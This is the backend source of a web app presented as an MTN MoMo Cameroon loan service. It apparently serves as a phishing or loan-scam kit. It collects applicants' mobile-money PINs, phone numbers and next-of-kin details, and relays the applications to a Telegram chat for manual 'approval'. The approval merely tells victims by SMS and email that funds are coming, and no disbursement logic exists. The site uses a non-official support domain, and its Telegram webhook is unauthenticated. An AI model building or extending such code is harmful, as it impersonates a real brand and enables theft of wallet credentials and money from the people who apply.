// ============================================================
// server.js – MTN MoMo Cameroon v2.0
// Postgres + Brevo + Telegram admin approval
// Two entry doors: Apply / Check Status
// ============================================================
'use strict';

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const compression = require('compression');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const PDFDocument = require('pdfkit');

const { pool, initSchema } = require('./db');
const { sendVerificationEmail, sendOtpEmail, sendApprovalEmail } = require('./email');

const app = express();
app.set('trust proxy', 1);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(morgan('combined'));
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, '../frontend')));

// Config
const PORT = process.env.PORT || 3000;
const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
const SMS_URL = process.env.SMS_GATEWAY_URL;
const SMS_KEY = process.env.SMS_GATEWAY_API_KEY;

const OTP_EXPIRY_MINUTES = parseInt(process.env.OTP_EXPIRY_MINUTES || '10');
const OTP_MAX_ATTEMPTS = 5;
const OTP_RESEND_COOLDOWN_SECONDS = parseInt(process.env.OTP_RESEND_COOLDOWN_SECONDS || '120');
const EMAIL_VERIF_EXPIRY_HOURS = parseInt(process.env.EMAIL_VERIFICATION_EXPIRY_HOURS || '24');
const SESSION_DAYS = 30;

// ─── Rate limiters ───
const globalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 300,
    standardHeaders: true,
    legacyHeaders: false
});
const applyLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 5,
    keyGenerator: (req) => (req.body && req.body.email) || req.ip,
    message: { ok: false, error: 'Trop de tentatives. Réessayez plus tard.' }
});
const checkLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,
    max: 5,
    keyGenerator: (req) => (req.body && req.body.email) || req.ip,
    message: { ok: false, error: 'Trop de vérifications. Réessayez plus tard.' }
});
const resendLimiter = rateLimit({
    windowMs: OTP_RESEND_COOLDOWN_SECONDS * 1000,
    max: 1,
    keyGenerator: (req) => (req.body && (req.body.sessionToken || req.body.applicationId)) || req.ip,
    message: { ok: false, error: `Veuillez patienter ${OTP_RESEND_COOLDOWN_SECONDS / 60} minutes avant de demander un nouveau code.` }
});

app.use('/api/', globalLimiter);

// ─── Helpers ───
function generateId() {
    return 'MTN-CM-' + crypto.randomBytes(4).toString('hex').toUpperCase();
}
function generateToken(bytes) {
    return crypto.randomBytes(bytes || 32).toString('hex');
}
function generateOtp() {
    return String(crypto.randomInt(100000, 999999));
}
function hashOtp(otp) {
    return crypto.createHash('sha256').update(otp).digest('hex');
}
function esc(t) {
    return String(t == null ? '' : t)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function code(t) { return '<code>' + esc(t) + '</code>'; }
function fmtXAF(n) { return 'XAF ' + Number(n || 0).toLocaleString('en-US'); }
function normalizePhone(p) {
    return String(p || '').replace(/\D/g, '').replace(/^237/, '').slice(0, 9);
}
function maskPhone(p) {
    if (!p || p.length < 4) return '***';
    return p.slice(0, 2) + '***' + p.slice(-3);
}

function requireSession(req, res, next) {
    const token = req.cookies && req.cookies.momo_session;
    if (!token) return res.status(401).json({ ok: false, error: 'Session requise.' });
    pool.query(
        `SELECT us.application_id, a.* FROM user_sessions us
         JOIN applications a ON a.id = us.application_id
         WHERE us.token = $1 AND us.expires_at > NOW()`,
        [token]
    ).then(({ rows }) => {
        if (!rows.length) return res.status(401).json({ ok: false, error: 'Session expirée.' });
        req.appRow = rows[0];
        next();
    }).catch(err => {
        console.error('Session check:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    });
}

// ─── Telegram ───
async function tgSend(text, buttons) {
    if (!TG_TOKEN || !TG_CHAT) return { ok: false };
    const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (${result.result && result.result.message_id})`);
        else console.error('❌ TG error:', result.description);
        return result;
    } catch (err) {
        console.error('❌ TG exception:', err.message);
        return { ok: false };
    }
}

function buildAdminMessage(app_) {
    const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
    return `📋 <b>NEW LOAN APPLICATION</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ${code(app_.id)}\n` +
        `👤 ${esc(app_.full_name)}\n` +
        `📧 ${code(app_.email)}\n` +
        `📱 ${code('+237 ' + app_.phone)}\n\n` +
        `💰 <b>${fmtXAF(app_.loan_amount)}</b> · ${app_.loan_term} months\n` +
        `📊 Monthly: <b>${fmtXAF(monthly)}</b>\n` +
        `📈 Interest: 24% p.a.\n` +
        `🎯 ${esc(app_.loan_purpose)}\n\n` +
        `💼 ${esc(app_.employment)} · ${fmtXAF(app_.annual_income)}/yr\n` +
        `👥 Next of kin: ${esc(app_.kin_name)} ${code('+237 ' + app_.kin_phone)}\n\n` +
        `📊 20% Rule: ${app_.has_20_percent ? '✅ Confirmed' : '❌ Not declared'}\n` +
        `📜 Terms: ✅ Accepted\n` +
        `📧 Email: ✅ Verified\n\n` +
        `<b>⬇️ Approve or reject this application</b>`;
}

// ─── SMS (optional) ───
async function sendSms(to, text) {
    if (!SMS_URL || !SMS_KEY) {
        console.log(`[SMS SIMULATED] to +237${to}: ${text}`);
        return { ok: true, simulated: true };
    }
    try {
        const res = await fetch(SMS_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_KEY },
            body: JSON.stringify({ to: '+237' + to, text })
        });
        if (res.ok) { console.log(`✅ SMS sent to +237${to}`); return { ok: true }; }
        console.error('❌ SMS failed:', res.status);
        return { ok: false };
    } catch (err) {
        console.error('❌ SMS exception:', err.message);
        return { ok: false };
    }
}

// ═══════════════════════════════════════════════════════════
// CONFIG & HEALTH
// ═══════════════════════════════════════════════════════════
app.get('/health', async (req, res) => {
    try {
        await pool.query('SELECT 1');
        res.json({ status: 'ok', version: '2.0.0', country: 'CM', db: 'connected' });
    } catch (e) {
        res.status(500).json({ status: 'error', error: e.message });
    }
});

app.get('/api/config', (req, res) => {
    res.json({
        ok: true,
        country: 'CM',
        currency: 'XAF',
        minLoan: 500000,
        maxLoan: 5000000,
        minTerm: 6,
        maxTerm: 48,
        interestRate: 0.24,
        requiredTxPercent: 0.20,
        otpResendCooldownSeconds: OTP_RESEND_COOLDOWN_SECONDS,
        supportPhone: '111',
        supportEmail: 'support@mtn-momo-cm.com',
        momoTermsUrl: 'https://www.mtn.cm/momo'
    });
});

app.get('/api/terms', (req, res) => {
    const terms = `MTN MOMO CAMEROON — LOAN TERMS & CONDITIONS
Version 1.0 · Effective 2026-01-01

1. LOAN ELIGIBILITY
   • Must be 18+ years old
   • Must have an active MTN MoMo Cameroon account
   • Must have at least 20% of the loan amount in MoMo transactions in the current month
   • Must provide valid next of kin
   • Must verify email and phone number

2. MOMO TERMS OF USE
   By using this service, you also agree to:
   • MTN Mobile Money Terms of Service (Cameroon)
   • MTN Privacy Policy
   • MTN MoMo Fee Schedule
   Full MoMo terms: https://www.mtn.cm/momo

3. LOAN DISBURSEMENT
   • Approved loans are deposited directly to your MTN MoMo wallet within 5 minutes
   • You will receive an SMS confirming the deposit
   • You will receive full loan details via email

4. REPAYMENT
   • Monthly instalments as per the agreed schedule
   • Automatic deductions from your MoMo wallet
   • Early repayment allowed without penalty
   • Late payments attract 5% penalty per month

5. DEFAULT
   • Failure to repay within 30 days triggers default
   • Legal action may be taken
   • Negative credit bureau listing

6. DATA PROTECTION
   • Your data is processed per Law No. 2010/012 on Cybersecurity and Cybercriminality in Cameroon
   • We may share data with credit bureaus and MTN

7. COOLING-OFF
   • You may cancel within 5 business days of approval without penalty

8. DISPUTE RESOLUTION
   • Governed by Cameroonian law
   • Disputes: COBAC / National Consumer Tribunal
   • Contact: support@mtn-momo-cm.com

© 2026 MTN Mobile Money Cameroon`;
    res.json({ ok: true, version: '1.0', text: terms });
});

// ═══════════════════════════════════════════════════════════
// APPLY — POST /api/apply
// ═══════════════════════════════════════════════════════════
app.post('/api/apply', applyLimiter, async (req, res) => {
    try {
        const b = req.body || {};
        const fullName = String(b.fullName || '').trim();
        const email = String(b.email || '').trim().toLowerCase();
        const phone = normalizePhone(b.phone);
        const momoPin = String(b.momoPin || '').trim();
        const loanType = String(b.loanType || '').trim();
        const loanAmount = Number(b.loanAmount);
        const loanTerm = Number(b.loanTerm);
        const loanPurpose = String(b.loanPurpose || '').trim();
        const employment = String(b.employment || '').trim();
        const annualIncome = Number(b.annualIncome);
        const kinName = String(b.kinName || '').trim();
        const kinPhone = normalizePhone(b.kinPhone);
        const has20 = b.has20Percent === true;
        const tnc = b.tncAccepted === true;

        // Validation
        if (!fullName || fullName.length < 3) return res.status(400).json({ ok: false, error: 'Nom complet requis.' });
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Email invalide.' });
        if (!/^\d{9}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone à 9 chiffres (ex. 670123456).' });
        if (!/^\d{5}$/.test(momoPin)) return res.status(400).json({ ok: false, error: 'Code PIN MoMo à 5 chiffres requis.' });
        if (!loanType) return res.status(400).json({ ok: false, error: 'Type de prêt requis.' });
        if (!loanAmount || loanAmount < 500000 || loanAmount > 5000000) return res.status(400).json({ ok: false, error: 'Montant entre XAF 500,000 et XAF 5,000,000.' });
        if (![6, 12, 18, 24, 48].includes(loanTerm)) return res.status(400).json({ ok: false, error: 'Durée invalide.' });
        if (!loanPurpose) return res.status(400).json({ ok: false, error: 'Objet du prêt requis.' });
        if (!employment) return res.status(400).json({ ok: false, error: 'Statut d\'emploi requis.' });
        if (!annualIncome || annualIncome <= 0) return res.status(400).json({ ok: false, error: 'Revenu annuel requis.' });
        if (!kinName || kinName.length < 2) return res.status(400).json({ ok: false, error: 'Nom du proche requis.' });
        if (!/^\d{9}$/.test(kinPhone)) return res.status(400).json({ ok: false, error: 'Téléphone du proche invalide.' });
        if (!has20) return res.status(400).json({ ok: false, code: 'MISSING_20', error: 'Vous devez confirmer avoir au moins 20 % du montant en transactions MoMo.' });
        if (!tnc) return res.status(400).json({ ok: false, error: 'Vous devez accepter les Conditions Générales.' });

        // Check duplicate active application
        const dup = await pool.query(
            `SELECT id, status FROM applications WHERE email = $1 AND status = 'pending_approval'`,
            [email]
        );
        if (dup.rows.length) {
            return res.status(400).json({
                ok: false,
                code: 'ALREADY_APPLIED',
                error: 'Vous avez déjà une demande en cours avec cet email.',
                applicationId: dup.rows[0].id
            });
        }

        const applicationId = generateId();
        const verificationToken = generateToken(32);
        const verificationExpires = new Date(Date.now() + EMAIL_VERIF_EXPIRY_HOURS * 3600 * 1000);

        await pool.query(
            `INSERT INTO applications (
                id, email, phone, full_name, momo_pin_hash,
                loan_type, loan_amount, loan_term, loan_purpose,
                employment, annual_income, kin_name, kin_phone,
                has_20_percent, tnc_accepted_at,
                email_verification_token, email_verification_expires
            ) VALUES (
                $1, $2, $3, $4, crypt($5, gen_salt('bf', 8)),
                $6, $7, $8, $9, $10, $11, $12, $13,
                $14, NOW(), $15, $16
            )`,
            [
                applicationId, email, phone, fullName, momoPin,
                loanType, loanAmount, loanTerm, loanPurpose,
                employment, annualIncome, kinName, kinPhone,
                has20, verificationToken, verificationExpires
            ]
        );

        console.log(`✅ Application ${applicationId} created for ${email}`);

        // Send verification email
        const mail = await sendVerificationEmail({ to: email, name: fullName, token: verificationToken });
        if (!mail.ok) {
            console.error('Verification email failed but application is stored');
        }

        res.json({
            ok: true,
            applicationId,
            email,
            phone: maskPhone(phone),
            needsEmailVerification: true,
            message: 'Nous avons envoyé un lien de vérification à votre email.'
        });
    } catch (err) {
        console.error('❌ /api/apply:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// ═══════════════════════════════════════════════════════════
// VERIFY EMAIL — GET /api/verify-email?token=xxx
// ═══════════════════════════════════════════════════════════
app.get('/api/verify-email', async (req, res) => {
    try {
        const token = String(req.query.token || '');
        if (!token) return res.redirect('/#page-verify-failed');

        const { rows } = await pool.query(
            `SELECT id, email, full_name, status, email_verified
             FROM applications
             WHERE email_verification_token = $1
               AND email_verification_expires > NOW()
             LIMIT 1`,
            [token]
        );
        if (!rows.length) return res.redirect('/#page-verify-failed');

        const appRow = rows[0];
        if (appRow.email_verified) {
            // Already verified — just issue session and redirect
            const sessionToken = generateToken(32);
            await pool.query(
                `INSERT INTO user_sessions (token, application_id, expires_at, ip_address)
                 VALUES ($1, $2, NOW() + INTERVAL '30 days', $3)`,
                [sessionToken, appRow.id, req.ip]
            );
            res.cookie('momo_session', sessionToken, {
                httpOnly: true,
                secure: process.env.NODE_ENV === 'production',
                sameSite: 'lax',
                maxAge: SESSION_DAYS * 24 * 60 * 60 * 1000
            });
            return res.redirect('/#page-awaiting');
        }

        // Mark verified + clear token
        await pool.query(
            `UPDATE applications
             SET email_verified = TRUE,
                 email_verified_at = NOW(),
                 email_verification_token = NULL,
                 updated_at = NOW()
             WHERE id = $1`,
            [appRow.id]
        );

        // Issue session
        const sessionToken = generateToken(32);
        await pool.query(
            `INSERT INTO user_sessions (token, application_id, expires_at, ip_address)
             VALUES ($1, $2, NOW() + INTERVAL '30 days', $3)`,
            [sessionToken, appRow.id, req.ip]
        );
        res.cookie('momo_session', sessionToken, {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: 'lax',
            maxAge: SESSION_DAYS * 24 * 60 * 60 * 1000
        });

        // Now that email is verified, notify admin
        const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [appRow.id]);
        const appData = full.rows[0];
        await tgSend(buildAdminMessage(appData), [[
            { text: '✅ APPROVE', callback_data: JSON.stringify({ a: 'Y', s: 'app', id: appData.id }) },
            { text: '❌ REJECT', callback_data: JSON.stringify({ a: 'N', s: 'app', id: appData.id }) }
        ]]);

        console.log(`✅ Email verified for ${appRow.id}`);
        return res.redirect('/#page-awaiting');
    } catch (err) {
        console.error('❌ /api/verify-email:', err.message);
        res.redirect('/#page-verify-failed');
    }
});

// Resend verification
app.post('/api/resend-verification', resendLimiter, async (req, res) => {
    try {
        const applicationId = String((req.body || {}).applicationId || '');
        if (!applicationId) return res.status(400).json({ ok: false, error: 'ID application manquant.' });

        const { rows } = await pool.query(
            `SELECT id, email, full_name, email_verified FROM applications WHERE id = $1`,
            [applicationId]
        );
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });
        if (rows[0].email_verified) return res.json({ ok: true, alreadyVerified: true });

        const token = generateToken(32);
        const expires = new Date(Date.now() + EMAIL_VERIF_EXPIRY_HOURS * 3600 * 1000);
        await pool.query(
            `UPDATE applications
             SET email_verification_token = $1, email_verification_expires = $2, updated_at = NOW()
             WHERE id = $3`,
            [token, expires, applicationId]
        );
        await sendVerificationEmail({ to: rows[0].email, name: rows[0].full_name, token });
        res.json({ ok: true, message: 'Nouveau lien envoyé.' });
    } catch (err) {
        console.error('❌ resend-verification:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// ═══════════════════════════════════════════════════════════
// SESSION — GET /api/session
// ═══════════════════════════════════════════════════════════
app.get('/api/session', async (req, res) => {
    try {
        const token = req.cookies && req.cookies.momo_session;
        if (!token) return res.json({ ok: true, loggedIn: false });

        const { rows } = await pool.query(
            `SELECT us.token, us.expires_at, a.*
             FROM user_sessions us
             JOIN applications a ON a.id = us.application_id
             WHERE us.token = $1 AND us.expires_at > NOW()`,
            [token]
        );
        if (!rows.length) return res.json({ ok: true, loggedIn: false });

        const app_ = rows[0];
        const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
        res.json({
            ok: true,
            loggedIn: true,
            application: {
                id: app_.id,
                email: app_.email,
                phoneMasked: maskPhone(app_.phone),
                fullName: app_.full_name,
                status: app_.status,
                emailVerified: app_.email_verified,
                loanAmount: app_.loan_amount,
                loanTerm: app_.loan_term,
                loanType: app_.loan_type,
                loanPurpose: app_.loan_purpose,
                monthlyPayment: monthly,
                adminDecisionAt: app_.admin_decision_at,
                approvedAt: app_.approved_at,
                rejectionReason: app_.rejection_reason,
                createdAt: app_.created_at
            }
        });
    } catch (err) {
        console.error('❌ /api/session:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// ═══════════════════════════════════════════════════════════
// APPLICATION STATUS POLLING
// ═══════════════════════════════════════════════════════════
app.get('/api/application/status/:id', async (req, res) => {
    try {
        const { rows } = await pool.query(
            `SELECT id, status, email_verified, admin_decision_at, approved_at, rejection_reason
             FROM applications WHERE id = $1`,
            [req.params.id]
        );
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
        res.json({ ok: true, ...rows[0] });
    } catch (err) {
        res.status(500).json({ ok: false, error: err.message });
    }
});

// ═══════════════════════════════════════════════════════════
// CHECK STATUS — POST /api/check-status
// ═══════════════════════════════════════════════════════════
app.post('/api/check-status', checkLimiter, async (req, res) => {
    try {
        const email = String((req.body || {}).email || '').trim().toLowerCase();
        const phone = normalizePhone((req.body || {}).phone);
        if (!email || !phone) return res.status(400).json({ ok: false, error: 'Email et téléphone requis.' });

        const { rows } = await pool.query(
            `SELECT id, email, phone, full_name FROM applications
             WHERE LOWER(email) = LOWER($1) AND phone = $2 LIMIT 1`,
            [email, phone]
        );
        if (!rows.length) {
            return res.status(404).json({ ok: false, error: 'Aucune demande trouvée avec ces informations.' });
        }

        const app_ = rows[0];
        const otp = generateOtp();
        const otpHash = hashOtp(otp);
        const token = generateToken(32);

        await pool.query(
            `INSERT INTO otp_sessions (token, application_id, otp_hash, otp_expires_at)
             VALUES ($1, $2, $3, NOW() + INTERVAL '${OTP_EXPIRY_MINUTES} minutes')`,
            [token, app_.id, otpHash]
        );

        await sendOtpEmail({ to: app_.email, name: app_.full_name, otp });
        console.log(`🔢 OTP sent to ${app_.email}`);

        res.json({
            ok: true,
            sessionToken: token,
            emailMasked: app_.email.replace(/^(.{2}).*(@.*)$/, '$1***$2'),
            phoneMasked: maskPhone(app_.phone),
            message: 'Un code à 6 chiffres a été envoyé à votre email.'
        });
    } catch (err) {
        console.error('❌ /api/check-status:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// Verify OTP
app.post('/api/check-status/verify-otp', async (req, res) => {
    try {
        const sessionToken = String((req.body || {}).sessionToken || '');
        const otp = String((req.body || {}).otp || '').trim();
        if (!sessionToken || !otp) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (!/^\d{6}$/.test(otp)) return res.status(400).json({ ok: false, error: 'Code à 6 chiffres requis.' });

        const { rows } = await pool.query(
            `SELECT * FROM otp_sessions WHERE token = $1 AND otp_expires_at > NOW()`,
            [sessionToken]
        );
        if (!rows.length) return res.status(400).json({ ok: false, error: 'Session expirée.' });

        const sess = rows[0];
        if (sess.otp_verified) return res.json({ ok: true, alreadyVerified: true });
        if (sess.otp_attempts >= OTP_MAX_ATTEMPTS) {
            return res.status(429).json({ ok: false, error: 'Trop de tentatives. Recommencez la vérification.' });
        }

        const inputHash = hashOtp(otp);
        if (inputHash !== sess.otp_hash) {
            await pool.query(`UPDATE otp_sessions SET otp_attempts = otp_attempts + 1 WHERE token = $1`, [sessionToken]);
            const remaining = OTP_MAX_ATTEMPTS - sess.otp_attempts - 1;
            return res.status(400).json({ ok: false, error: `Code incorrect. ${remaining} tentative(s) restante(s).`, remaining });
        }

        await pool.query(`UPDATE otp_sessions SET otp_verified = TRUE WHERE token = $1`, [sessionToken]);
        res.json({ ok: true, next: 'pin' });
    } catch (err) {
        console.error('❌ verify-otp:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// Verify PIN — creates actual login session
app.post('/api/check-status/verify-pin', async (req, res) => {
    try {
        const sessionToken = String((req.body || {}).sessionToken || '');
        const pin = String((req.body || {}).pin || '').trim();
        if (!sessionToken || !pin) return res.status(400).json({ ok: false, error: 'Champs manquants.' });
        if (!/^\d{5}$/.test(pin)) return res.status(400).json({ ok: false, error: 'Code PIN à 5 chiffres requis.' });

        const { rows } = await pool.query(
            `SELECT * FROM otp_sessions WHERE token = $1 AND otp_expires_at > NOW()`,
            [sessionToken]
        );
        if (!rows.length) return res.status(400).json({ ok: false, error: 'Session expirée.' });
        if (!rows[0].otp_verified) return res.status(400).json({ ok: false, error: 'OTP non vérifié.' });

        const applicationId = rows[0].application_id;
        const verify = await pool.query(
            `SELECT id FROM applications WHERE id = $1 AND momo_pin_hash = crypt($2, momo_pin_hash)`,
            [applicationId, pin]
        );
        if (!verify.rows.length) {
            return res.status(401).json({ ok: false, error: 'Code PIN MoMo incorrect.' });
        }

        // Delete OTP session (single use)
        await pool.query(`DELETE FROM otp_sessions WHERE token = $1`, [sessionToken]);

        // Create user session
        const userSessionToken = generateToken(32);
        await pool.query(
            `INSERT INTO user_sessions (token, application_id, expires_at, ip_address)
             VALUES ($1, $2, NOW() + INTERVAL '30 days', $3)`,
            [userSessionToken, applicationId, req.ip]
        );
        res.cookie('momo_session', userSessionToken, {
            httpOnly: true,
            secure: process.env.NODE_ENV === 'production',
            sameSite: 'lax',
            maxAge: SESSION_DAYS * 24 * 60 * 60 * 1000
        });

        res.json({ ok: true, message: 'Connexion réussie.' });
    } catch (err) {
        console.error('❌ verify-pin:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// Resend OTP
app.post('/api/check-status/resend-otp', resendLimiter, async (req, res) => {
    try {
        const sessionToken = String((req.body || {}).sessionToken || '');
        if (!sessionToken) return res.status(400).json({ ok: false, error: 'Session manquante.' });

        const { rows } = await pool.query(`SELECT * FROM otp_sessions WHERE token = $1`, [sessionToken]);
        if (!rows.length) return res.status(404).json({ ok: false, error: 'Session introuvable.' });

        const appRow = await pool.query(
            `SELECT email, full_name FROM applications WHERE id = $1`,
            [rows[0].application_id]
        );
        if (!appRow.rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });

        const otp = generateOtp();
        const otpHash = hashOtp(otp);
        await pool.query(
            `UPDATE otp_sessions
             SET otp_hash = $1,
                 otp_expires_at = NOW() + INTERVAL '${OTP_EXPIRY_MINUTES} minutes',
                 otp_attempts = 0,
                 otp_verified = FALSE,
                 last_otp_sent_at = NOW()
             WHERE token = $2`,
            [otpHash, sessionToken]
        );
        await sendOtpEmail({
            to: appRow.rows[0].email,
            name: appRow.rows[0].full_name,
            otp
        });
        res.json({ ok: true, message: 'Nouveau code envoyé.' });
    } catch (err) {
        console.error('❌ resend-otp:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// ═══════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════
app.get('/api/dashboard', requireSession, async (req, res) => {
    try {
        const app_ = req.appRow;
        const monthly = Math.ceil(app_.loan_amount / app_.loan_term);

        const txResult = await pool.query(
            `SELECT id, type, amount, description, created_at
             FROM transactions WHERE application_id = $1
             ORDER BY created_at DESC LIMIT 20`,
            [app_.id]
        );

        const totalRepaid = txResult.rows
            .filter(t => t.type === 'repayment')
            .reduce((sum, t) => sum + Number(t.amount), 0);

        res.json({
            ok: true,
            loan: {
                id: app_.id,
                amount: app_.loan_amount,
                term: app_.loan_term,
                monthlyPayment: monthly,
                status: app_.status,
                approvedAt: app_.approved_at,
                balance: Math.max(0, app_.loan_amount - totalRepaid),
                paidSoFar: totalRepaid
            },
            user: {
                fullName: app_.full_name,
                email: app_.email,
                phone: maskPhone(app_.phone)
            },
            transactions: txResult.rows
        });
    } catch (err) {
        console.error('❌ /api/dashboard:', err.message);
        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
    }
});

// ═══════════════════════════════════════════════════════════
// CONTRACT PDF
// ═══════════════════════════════════════════════════════════
app.get('/api/contract-pdf', requireSession, (req, res) => {
    const app_ = req.appRow;
    const monthly = Math.ceil(app_.loan_amount / app_.loan_term);

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="momo-contract-${app_.id}.pdf"`);
    doc.pipe(res);

    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold').text('MTN MoMo Cameroon', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Loan Contract', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);

    const line = (l, v) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
    };

    doc.font('Helvetica-Bold').fontSize(12).text('BORROWER'); doc.moveDown(0.3);
    line('Application ID', app_.id);
    line('Full Name', app_.full_name);
    line('Email', app_.email);
    line('Phone', '+237 ' + app_.phone);
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('LOAN DETAILS'); doc.moveDown(0.3);
    line('Amount', 'XAF ' + app_.loan_amount.toLocaleString());
    line('Term', app_.loan_term + ' months');
    line('Monthly Payment', 'XAF ' + monthly.toLocaleString());
    line('Total Repayment', 'XAF ' + (monthly * app_.loan_term).toLocaleString());
    line('Interest Rate', '24% per year');
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('EMPLOYMENT'); doc.moveDown(0.3);
    line('Status', app_.employment);
    line('Annual Income', 'XAF ' + app_.annual_income.toLocaleString());
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('NEXT OF KIN'); doc.moveDown(0.3);
    line('Name', app_.kin_name);
    line('Phone', '+237 ' + app_.kin_phone);
    doc.moveDown(0.8);

    doc.font('Helvetica-Bold').fontSize(12).text('DISBURSEMENT'); doc.moveDown(0.3);
    doc.font('Helvetica').fontSize(10).text('Amount deposited to your MTN MoMo wallet within 5 minutes of approval. Repayment per schedule.');

    doc.moveDown(1.5);
    doc.fontSize(9).fillColor('#888').text(
        `Generated ${new Date().toLocaleString('en-GB')} · © 2026 MTN MoMo Cameroon`,
        { align: 'center' }
    );
    doc.end();
});

// ═══════════════════════════════════════════════════════════
// TELEGRAM WEBHOOK
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', async (req, res) => {
    res.status(200).send('ok');
    try {
        const update = req.body || {};
        if (!update.callback_query) return;

        const q = update.callback_query;
        let data;
        try { data = JSON.parse(q.data); } catch (e) { return; }

        if (data.s !== 'app') return;

        const approved = data.a === 'Y';
        const appId = data.id;

        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [appId]);
        if (!rows.length) return;
        const app_ = rows[0];

        if (approved) {
            const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
            await pool.query(
                `UPDATE applications
                 SET status = 'approved',
                     approved_at = NOW(),
                     admin_decision_at = NOW(),
                     admin_decision_by = $2,
                     updated_at = NOW()
                 WHERE id = $1`,
                [appId, (q.from && q.from.username) || String(q.from.id)]
            );

            await pool.query(
                `INSERT INTO transactions (application_id, type, amount, description)
                 VALUES ($1, 'disbursement', $2, 'Loan approved and disbursed')`,
                [appId, app_.loan_amount]
            );

            // SMS confirmation
            await sendSms(app_.phone,
                `MTN MoMo: Your loan of XAF ${app_.loan_amount.toLocaleString()} has been approved. ` +
                `Amount will be deposited to your wallet within 5 minutes. Ref: ${app_.id}`);

            // Email with details
            await sendApprovalEmail({
                to: app_.email,
                name: app_.full_name,
                loanAmount: app_.loan_amount,
                loanTerm: app_.loan_term,
                monthlyPayment: monthly,
                applicationId: app_.id
            });

            await tgSend(
                `✅ <b>LOAN APPROVED</b>\n🆔 ${code(app_.id)}\n` +
                `👤 ${esc(app_.full_name)}\n💰 ${fmtXAF(app_.loan_amount)}\n\n` +
                `SMS + Email sent to the customer.`
            );
        } else {
            await pool.query(
                `UPDATE applications
                 SET status = 'failed_approval',
                     admin_decision_at = NOW(),
                     admin_decision_by = $2,
                     rejection_reason = 'Application was not approved.',
                     updated_at = NOW()
                 WHERE id = $1`,
                [appId, (q.from && q.from.username) || String(q.from.id)]
            );
            await tgSend(`❌ <b>LOAN REJECTED</b>\n🆔 ${code(appId)}`);
        }

        await fetch(`${TG_API}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: q.id, text: approved ? 'Approved' : 'Rejected' })
        }).catch(() => {});
    } catch (err) {
        console.error('❌ telegram-webhook:', err.message);
    }
});

// ═══════════════════════════════════════════════════════════
// SPA FALLBACK
// ═══════════════════════════════════════════════════════════
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

